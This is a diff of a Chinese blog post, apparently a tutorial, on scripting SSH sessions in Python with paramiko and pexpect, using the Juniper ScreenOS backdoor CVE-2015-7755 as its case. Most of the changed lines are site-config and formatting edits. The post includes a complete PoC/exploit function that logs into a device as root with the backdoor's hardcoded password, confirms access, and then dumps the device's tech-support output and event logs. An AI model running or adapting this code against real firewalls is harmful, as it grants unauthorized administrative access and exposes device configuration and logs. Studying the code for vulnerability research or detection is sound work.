@@ -22,15 +22,15 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"dog.wtf","root":"/","scheme":"Muse","version":"7.8.0","exturl":true,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"dog.wtf","root":"/","scheme":"Muse","version":"7.8.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="Title(EN): Shell Interaction in Python #2: SSH Author: dog2   难点 1. 模块选择 对于SSH交互而言，很难以纯socket去实现，因为SSH的认证过程中涉及到各种算法，工作量太大，因此考虑使用已有的SSH模块实现。 (1) paramiko SSH交互最常用的是第三方模块是paramiko：  文档 源码">
+  <meta name="description" content="Title(EN): Shell Interaction in Python #2: SSH Author: dog2   难点1. 模块选择对于SSH交互而言，很难以纯socket去实现，因为SSH的认证过程中涉及到各种算法，工作量太大，因此考虑使用已有的SSH模块实现。 (1) paramikoSSH交互最常用的是第三方模块是paramiko：  文档 源码">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（二）: SSH篇">
 <meta property="og:url" content="http://dog.wtf/tech/shell-interaction-in-python-2-ssh/index.html">
 <meta property="og:site_name" content="雪泥鴻爪">
-<meta property="og:description" content="Title(EN): Shell Interaction in Python #2: SSH Author: dog2   难点 1. 模块选择 对于SSH交互而言，很难以纯socket去实现，因为SSH的认证过程中涉及到各种算法，工作量太大，因此考虑使用已有的SSH模块实现。 (1) paramiko SSH交互最常用的是第三方模块是paramiko：  文档 源码">
+<meta property="og:description" content="Title(EN): Shell Interaction in Python #2: SSH Author: dog2   难点1. 模块选择对于SSH交互而言，很难以纯socket去实现，因为SSH的认证过程中涉及到各种算法，工作量太大，因此考虑使用已有的SSH模块实现。 (1) paramikoSSH交互最常用的是第三方模块是paramiko：  文档 源码">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2015-12-30T13:22:22.000Z">
 <meta property="article:modified_time" content="2015-12-30T13:22:22.000Z">
@@ -39,8 +39,8 @@
 <meta property="article:tag" content="Security">
 <meta property="article:tag" content="CVE">
 <meta property="article:tag" content="PoC&#x2F;Exp">
-<meta property="article:tag" content="Vul">
 <meta property="article:tag" content="SSH">
+<meta property="article:tag" content="Vul">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="http://dog.wtf/tech/shell-interaction-in-python-2-ssh/">
@@ -201,10 +201,6 @@
     </header>
 
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
   <a role="button" class="book-mark-link book-mark-link-fixed"></a>
 
 
@@ -305,74 +301,74 @@
 <li>Title(EN): <em><strong>Shell Interaction in Python #2: SSH</strong></em></li>
 <li>Author: dog2</li>
 </ul>
-<hr />
-<h3 id="难点">难点</h3>
-<h4 id="模块选择">1. 模块选择</h4>
-<p>对于SSH交互而言，很难以纯socket去实现，因为SSH的认证过程中涉及到各种算法，工作量太大，因此考虑使用已有的SSH模块实现。</p>
-<h5 id="paramiko">(1) paramiko</h5>
-<p>SSH交互最常用的是第三方模块是paramiko：</p>
+<hr>
+<h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><h4 id="1-模块选择"><a href="#1-模块选择" class="headerlink" title="1. 模块选择"></a>1. 模块选择</h4><p>对于SSH交互而言，很难以纯socket去实现，因为SSH的认证过程中涉及到各种算法，工作量太大，因此考虑使用已有的SSH模块实现。</p>
+<h5 id="1-paramiko"><a href="#1-paramiko" class="headerlink" title="(1) paramiko"></a>(1) paramiko</h5><p>SSH交互最常用的是第三方模块是paramiko：</p>
 <ul>
 <li><span class="exturl" data-url="aHR0cDovL2RvY3MucGFyYW1pa28ub3JnLw==">文档<i class="fa fa-external-link-alt"></i></span></li>
 <li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhcmFtaWtvL3BhcmFtaWtvL3RyZWUvbWFzdGVyL3BhcmFtaWtv">源码<i class="fa fa-external-link-alt"></i></span></li>
 </ul>
 <a id="more"></a>
+
 <p>下面给出使用paramiko进行ssh登录的一个demo:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sshLogin</span><span class="params">(host, username, password, port=<span class="number">22</span>, timeout=<span class="number">5</span>)</span>:</span></span><br><span class="line">    ssh = paramiko.SSHClient()</span><br><span class="line">    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ssh.connect(</span><br><span class="line">            host,</span><br><span class="line">            username=username,</span><br><span class="line">            password=password,</span><br><span class="line">            timeout=timeout,</span><br><span class="line">            compress=<span class="literal">True</span>,</span><br><span class="line">            allow_agent=<span class="literal">False</span>,</span><br><span class="line">            look_for_keys=<span class="literal">False</span>,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">print</span> ssh._transport.authenticated</span><br><span class="line">        <span class="keyword">print</span> ssh._transport.get_banner()</span><br><span class="line">        stdin, stdout, stderr = ssh.exec_command(<span class="string">'ls'</span>, bufsize=<span class="number">1024</span>, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> stdout:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'... '</span> + line.strip(<span class="string">'\n'</span>)</span><br><span class="line">        ssh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> paramiko.AuthenticationException <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> paramiko.SSHException <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
 <p>代码说明：</p>
 <ul>
 <li>17行：用于判断是否登录成功</li>
 <li>18行：用于输出ssh banner，即登录成功后的欢迎字符串，比如我的vps登录成功后有如下欢迎字符串:</li>
 </ul>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Welcome to Ubuntu <span class="number">14.04</span><span class="number">.3</span> LTS (GNU/Linux <span class="number">3.13</span><span class="number">.0</span><span class="number">-68</span>-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:<span class="comment">//help.ubuntu.com/</span></span><br><span class="line">Last login: Wed Dec <span class="number">30</span> <span class="number">01</span>:<span class="number">55</span>:<span class="number">57</span> <span class="number">2015</span> <span class="keyword">from</span> <span class="number">222.222</span><span class="number">.222</span><span class="number">.222</span></span><br><span class="line"><span class="symbol">root@</span>vultr:~# c</span><br></pre></td></tr></table></figure>
+
+
 <p>使用如上demo函数尝试登录我的vps，成功登录并打印了ls命令的输出。</p>
 <p>但是存在如下问题：</p>
 <ul>
 <li>使用如上sshLogin函数登录juniper设备，代码运行到17行时输出为True，说明成功登录了，但当执行到第19行时，会出现如下错误：</li>
 </ul>
 <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/client.py"</span>, <span class="keyword">line</span> 405, <span class="keyword">in</span> exec_command</span><br><span class="line">    chan.exec_command(command)</span><br><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, <span class="keyword">line</span> 60, <span class="keyword">in</span> _check</span><br><span class="line">    <span class="keyword">return</span> func(self, *<span class="keyword">args</span>, **kwds)</span><br><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, <span class="keyword">line</span> 229, <span class="keyword">in</span> exec_command</span><br><span class="line">    self._wait_for_event()</span><br><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, <span class="keyword">line</span> 1086, <span class="keyword">in</span> _wait_for_event</span><br><span class="line">    raise <span class="keyword">e</span></span><br><span class="line">paramiko.ssh_exception.SSHException: Channel closed.</span><br></pre></td></tr></table></figure>
+
 <p>这会导致SSH连接的中断，导致这种异常的原因，可能是juniper这种设备的SSH实现是非标准的，而paramiko对这些非标准SSH支持不佳所致，而使用Unix/Linux自带的SSH客户端程序登陆这些设备就没有这种问题。看来paramiko并不是完美的解决方案，如果仅仅需要验证是否登陆成功，它还是可以满足的。</p>
 <ul>
 <li>无论目标是我的vps还是juniper设备，第18行输出的都是空字符串。在google上百度了一下，有人遇到类似问题（<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhcmFtaWtvL3BhcmFtaWtvL2lzc3Vlcy8yNzM=">#1<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhcmFtaWtvL3BhcmFtaWtvL3B1bGwvNTg=">#2<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy8yNTYwOTE1My9wYXJhbWlrby1lcnJvci1yZWFkaW5nLXNzaC1wcm90b2NvbC1iYW5uZXI=">#3<i class="fa fa-external-link-alt"></i></span>），也有人做了解答，但大都还是说调用get_banner()函数，并不是解决办法。猜测这可能是paramiko自身的问题，没有深究，如果您知道原因及解决办法，还请指教。</li>
 </ul>
-<h5 id="pexpect">(2) pexpect</h5>
-<p>从Freebuf文章 <span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS92dWxzLzkwODg2Lmh0bWw=">&quot;利用Censys批量获取Juniper Netscreen后门&quot;<i class="fa fa-external-link-alt"></i></span> 中了解到pexpect可以用来实现SSH交互，于是简单了解一番。</p>
+<h5 id="2-pexpect"><a href="#2-pexpect" class="headerlink" title="(2) pexpect"></a>(2) pexpect</h5><p>从Freebuf文章 <span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS92dWxzLzkwODg2Lmh0bWw=">“利用Censys批量获取Juniper Netscreen后门”<i class="fa fa-external-link-alt"></i></span> 中了解到pexpect可以用来实现SSH交互，于是简单了解一番。</p>
 <ul>
 <li><span class="exturl" data-url="aHR0cDovL3BleHBlY3QucmVhZHRoZWRvY3Mub3JnLw==">文档<i class="fa fa-external-link-alt"></i></span></li>
 <li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BleHBlY3QvcGV4cGVjdC90cmVlL21hc3Rlci9wZXhwZWN0">源码<i class="fa fa-external-link-alt"></i></span></li>
-<li>相关资料:
-<ul>
+<li>相关资料:<ul>
 <li><span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDEv">探索 Pexpect，第 1 部分：剖析 Pexpect<i class="fa fa-external-link-alt"></i></span></li>
 <li><span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDIv">探索 Pexpect，第 2 部分：Pexpect 的实例分析<i class="fa fa-external-link-alt"></i></span></li>
-</ul></li>
+</ul>
+</li>
 </ul>
 <p>Freebuf的文章中提到了编写PoC验证设备是否还存在漏洞的思路：</p>
 <blockquote>
 <p>其实由于登录后并不是传统的SSH，而是该防火墙的操作终端，因此pxssh会认为并没有登录成功，而是返回超时异常，此时我们检测其返回的before字段如果有Remote Management Console字样就说明该主机存在后门。</p>
 </blockquote>
 <p>其中提到的pxssh是pexpect中的一个类pexpect.pxssh.pxssh，编写SSH交互程序需要用到它，使用示例参见<span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDIv">IBM的文档<i class="fa fa-external-link-alt"></i></span>。</p>
-<p>尝试了一番，pxssh其实是可以登陆成功的，并没有文章中所说的 &quot;返回异常&quot;。</p>
+<p>尝试了一番，pxssh其实是可以登陆成功的，并没有文章中所说的 “返回异常”。</p>
 <p>其实pxssh底层实现还是以进程的方式调用Unix/Linux自带的SSH可执行程序的，而正如上面提到的自带的SSH兼容性很强，因此使用pxssh编写PoC是不错的选择。</p>
 <p>但若将程序用于高并发扫描，需要权衡一下并发数与机器性能，因为每扫描一个目标就需要运行一个SSH客户端程序进程。</p>
-<h4 id="exp">2. Exp</h4>
-<p>PoC可以编写了，接下来是Exp，目标还是执行如下2个命令：</p>
+<h4 id="2-Exp"><a href="#2-Exp" class="headerlink" title="2. Exp"></a>2. Exp</h4><p>PoC可以编写了，接下来是Exp，目标还是执行如下2个命令：</p>
 <ul>
 <li><em><strong>get tech-support</strong></em> : 它综合了大部分get子命令的结果。</li>
 <li><em><strong>get event</strong></em> : 包含了设备日志。</li>
 </ul>
 <p>SSH Exp的逻辑与Telnet几乎一样，但是 pexpect.pxssh.pxssh 类中并没有类似于 telnetlib.Telnet 类中的 read_until(expected[, timeout]) 这种函数。</p>
-<p>我们可以使用实例函数 pxssh.sendline(cmd) 来发送命令，其中cmd为命令字符串，结尾不必包含，函数会在命令结尾自动添加。</p>
+<p>我们可以使用实例函数 pxssh.sendline(cmd) 来发送命令，其中cmd为命令字符串，结尾不必包含\n，函数会在命令结尾自动添加。</p>
 <p>但使用pxssh编写Exp，还是存在如下问题：</p>
 <ul>
 <li>pxssh默认将上一次命令执行后返回的结果字符串存储在实例变量pxssh.before中，但是在多次获取结果分段时，连续2次获取的消息分段会有重叠。</li>
 <li>从源码可以看到pxssh类继承自pexpect.pyt_spawn.spawn类，而spawn类又继承自pexpect.spawnbase.SpawnBase类。在SpawnBase类中，存在类变量buffer，用于接收服务器端发回的消息。因此尝试直接使用pxssh.buffer变量来代替before变量，并在每一次发送新的命令之前，将pxssh.buffer清空，但是又出现了结果不完整的问题。</li>
-<li>可以尝试使用<span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDIv">IBM的文章<i class="fa fa-external-link-alt"></i></span>中 &quot;例 3：ssh 的使用&quot; 提到的，直接使用spawn类来实现，但是该类较为底层，需要我们自己处理SSH的登录及交互逻辑，且其中expect函数的pattern参数需为pexpect.expect中定义的类实例，而不是直接传入字符串或正则表达式，使用起来较为繁琐。</li>
+<li>可以尝试使用<span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDIv">IBM的文章<i class="fa fa-external-link-alt"></i></span>中 “例 3：ssh 的使用” 提到的，直接使用spawn类来实现，但是该类较为底层，需要我们自己处理SSH的登录及交互逻辑，且其中expect函数的pattern参数需为pexpect.expect中定义的类实例，而不是直接传入字符串或正则表达式，使用起来较为繁琐。</li>
 </ul>
 <p>最终找到了合适的类函数 pexpect.pty_spawn.read_nonblocking(size=1, timeout=-1) ，它读取服务器端发来的数据，直到数据字节数达到size，或者达到超时时间timeout。但终止字符串就还需由我们自己判断。</p>
-<h3 id="代码">代码</h3>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pexpect</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pexpect <span class="keyword">import</span> pxssh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(host, port=<span class="number">22</span>, loginTimeout=<span class="number">10</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">        readTimeout=<span class="number">2</span>, successFlag=<span class="string">'ping other host'</span>, doExp=True)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(cmd, maxTo=<span class="number">3</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">readUntilTimeout</span><span class="params">()</span>:</span></span><br><span class="line">            errFlag = <span class="literal">False</span></span><br><span class="line">            data = <span class="string">''</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> errFlag:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    data += ssh.read_nonblocking(</span><br><span class="line">                        size=<span class="number">65536</span>,</span><br><span class="line">                        timeout=readTimeout</span><br><span class="line">                    )</span><br><span class="line">                <span class="keyword">except</span> pexpect.exceptions.ExceptionPexpect <span class="keyword">as</span> err:</span><br><span class="line">                    errFlag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">        readUntilTimeout()  <span class="comment"># skip verbose strings</span></span><br><span class="line">        toNum = <span class="number">0</span></span><br><span class="line">        ssh.send(cmd + <span class="string">'\n'</span>*<span class="number">20</span>)</span><br><span class="line">        data = readUntilTimeout()</span><br><span class="line">        ret = data</span><br><span class="line">        <span class="keyword">while</span> (<span class="string">'-&gt;'</span> <span class="keyword">not</span> <span class="keyword">in</span> data[<span class="number">-10</span>:]) <span class="keyword">and</span> (toNum &lt; maxTo):</span><br><span class="line">            data = readUntilTimeout()</span><br><span class="line">            ret += data</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                toNum += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            ssh.send(<span class="string">'\n'</span>*<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    ssh = pxssh.pxssh(timeout=readTimeout)</span><br><span class="line">    ssh.login(</span><br><span class="line">        server=host,</span><br><span class="line">        port=port,</span><br><span class="line">        username=<span class="string">'root'</span>,</span><br><span class="line">        password=<span class="string">"&lt;&lt;&lt; %s(un='%s') = %u"</span>,</span><br><span class="line">        auto_prompt_reset=<span class="literal">False</span>,</span><br><span class="line">        login_timeout=loginTimeout,</span><br><span class="line">    )</span><br><span class="line">    banner = ssh.before</span><br><span class="line">    ssh.sendline(<span class="string">'?'</span>)</span><br><span class="line">    help = ssh.read_nonblocking(size=<span class="number">65536</span>, timeout=readTimeout)</span><br><span class="line">    success = successFlag <span class="keyword">in</span> help.lower()</span><br><span class="line">    techsupport = <span class="string">''</span></span><br><span class="line">    event = <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">and</span> doExp:</span><br><span class="line">        techsupport = exp(cmd=<span class="string">'get tech-support'</span>)</span><br><span class="line">        event = exp(cmd=<span class="string">'get event'</span>)</span><br><span class="line">    <span class="keyword">return</span> success, banner, help, techsupport, event</span><br></pre></td></tr></table></figure>
+<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pexpect</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pexpect <span class="keyword">import</span> pxssh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(host, port=<span class="number">22</span>, loginTimeout=<span class="number">10</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">        readTimeout=<span class="number">2</span>, successFlag=<span class="string">'ping other host'</span>, doExp=True)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(cmd, maxTo=<span class="number">3</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">readUntilTimeout</span><span class="params">()</span>:</span></span><br><span class="line">            errFlag = <span class="literal">False</span></span><br><span class="line">            data = <span class="string">''</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> errFlag:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    data += ssh.read_nonblocking(</span><br><span class="line">                        size=<span class="number">65536</span>,</span><br><span class="line">                        timeout=readTimeout</span><br><span class="line">                    )</span><br><span class="line">                <span class="keyword">except</span> pexpect.exceptions.ExceptionPexpect <span class="keyword">as</span> err:</span><br><span class="line">                    errFlag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">        readUntilTimeout()  <span class="comment"># skip verbose strings</span></span><br><span class="line">        toNum = <span class="number">0</span></span><br><span class="line">        ssh.send(cmd + <span class="string">'\n'</span>*<span class="number">20</span>)</span><br><span class="line">        data = readUntilTimeout()</span><br><span class="line">        ret = data</span><br><span class="line">        <span class="keyword">while</span> (<span class="string">'-&gt;'</span> <span class="keyword">not</span> <span class="keyword">in</span> data[<span class="number">-10</span>:]) <span class="keyword">and</span> (toNum &lt; maxTo):</span><br><span class="line">            data = readUntilTimeout()</span><br><span class="line">            ret += data</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                toNum += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            ssh.send(<span class="string">'\n'</span>*<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    ssh = pxssh.pxssh(timeout=readTimeout)</span><br><span class="line">    ssh.login(</span><br><span class="line">        server=host,</span><br><span class="line">        port=port,</span><br><span class="line">        username=<span class="string">'root'</span>,</span><br><span class="line">        password=<span class="string">"&lt;&lt;&lt; %s(un='%s') = %u"</span>,</span><br><span class="line">        auto_prompt_reset=<span class="literal">False</span>,</span><br><span class="line">        login_timeout=loginTimeout,</span><br><span class="line">    )</span><br><span class="line">    banner = ssh.before</span><br><span class="line">    ssh.sendline(<span class="string">'?'</span>)</span><br><span class="line">    help = ssh.read_nonblocking(size=<span class="number">65536</span>, timeout=readTimeout)</span><br><span class="line">    success = successFlag <span class="keyword">in</span> help.lower()</span><br><span class="line">    techsupport = <span class="string">''</span></span><br><span class="line">    event = <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">and</span> doExp:</span><br><span class="line">        techsupport = exp(cmd=<span class="string">'get tech-support'</span>)</span><br><span class="line">        event = exp(cmd=<span class="string">'get event'</span>)</span><br><span class="line">    <span class="keyword">return</span> success, banner, help, techsupport, event</span><br></pre></td></tr></table></figure>
+
 <p>代码说明：</p>
 <ul>
-<li>26行：连续发送多个，一次性将服务器端的多个结果分段获取到客户端的接收缓存中，这样可以减少交互，提高程序效率。</li>
+<li>26行：连续发送多个\n，一次性将服务器端的多个结果分段获取到客户端的接收缓存中，这样可以减少交互，提高程序效率。</li>
 <li>29行：判断每次读取的缓存区中的数据的后10个字符串中是否存在 <strong>-&gt;</strong> 字符，来识别最后一个结果分段。</li>
 </ul>
 <p>代码逻辑与Telnet程序类似。</p>
@@ -389,8 +385,8 @@
               <a href="/tags/security/" rel="tag"># Security</a>
               <a href="/tags/cve/" rel="tag"># CVE</a>
               <a href="/tags/poc-exp/" rel="tag"># PoC/Exp</a>
-              <a href="/tags/vul/" rel="tag"># Vul</a>
               <a href="/tags/ssh/" rel="tag"># SSH</a>
+              <a href="/tags/vul/" rel="tag"># Vul</a>
           </div>
 
         
@@ -399,12 +395,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/tech/downloading-ftp-directory-recursively-with-python/" rel="prev" title="Python实现下载FTP服务器的整个目录（文件夹）">
-      <i class="fa fa-chevron-left"></i> Python实现下载FTP服务器的整个目录（文件夹）
+    <a href="/tech/shell-interaction-in-python-1-telnet/" rel="prev" title="Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（一）: Telnet篇">
+      <i class="fa fa-chevron-left"></i> Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（一）: Telnet篇
     </a></div>
       <div class="post-nav-item">
-    <a href="/tech/shell-interaction-in-python-1-telnet/" rel="next" title="Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（一）: Telnet篇">
-      Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（一）: Telnet篇 <i class="fa fa-chevron-right"></i>
+    <a href="/tech/heap-overflow-learning-notes-1/" rel="next" title="堆溢出学习笔记(Win2K) (上)">
+      堆溢出学习笔记(Win2K) (上) <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -471,7 +467,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
